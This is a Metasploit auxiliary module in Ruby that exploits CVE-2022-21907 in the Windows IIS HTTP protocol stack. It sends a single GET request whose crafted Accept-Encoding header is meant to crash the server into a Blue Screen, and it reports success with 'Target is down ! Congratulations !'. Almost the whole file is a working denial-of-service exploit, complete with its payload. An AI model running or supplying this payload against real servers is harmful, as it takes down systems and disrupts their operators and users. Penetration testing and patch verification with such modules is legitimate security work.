# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This module performs a DOS attack using a simple HTTP request.
#
###
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  ##
  # Initialize informations about module.
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2022-21907: HTTP Protocol Stack Remote Code Execution Vulnerability - Windows IIS DOS BlueScreen',
        'Description' => 'This module can be used to perform a DOS attack on IIS server. This module exploit the CVE-2022-21907 and causes a Blue Screen with only one payload.',
        'License' => MSF_LICENSE,
        'Author' => ['Maurice LAMBERT <mauricelambert434@gmail.com>'],
        'Platform' => 'win',
        'References' => [
          %w[CVE 2022-21907],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-21907'],
          ['URL', 'https://github.com/mauricelambert/CVE-2022-21907']
        ],
        'DisclosureDate' => '2022-01-11',
        'Notes' => {
          'Stability' => [CRASH_OS_RESTARTS],
          'Reliability' => [IOC_IN_LOGS],
          'SideEffects' => []
        }
      )
    )
  end

  ##
  # This module performs a DOS attack using a simple HTTP request.
  def run
    vprint_status('Trying first connection...')

    res = send_request_raw(
      'uri' => '/',
      'method' => 'GET'
    )

    if res.nil?
      fail_with(
        Failure::Unreachable,
        "#{peer} - Could not connect to web service - no response"
      )
    end

    vprint_good('First connection OK. Sending payload...')

    payload = {
      'Accept-Encoding' => 'AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,'
    }
    timeout = datastore['HttpClientTimeout']
    datastore['HttpClientTimeout'] = 10

    res = send_request_raw({
                             'uri' => '/',
                             'timeout' => 10,
                             'method' => 'GET',
                             'headers' => payload
                           })

    if res.nil?
      print_good('Target is down ! Congratulations !')
    else
      print_error('Target is not vulnerable and up.')
    end

    datastore['HttpClientTimeout'] = timeout
  end
end
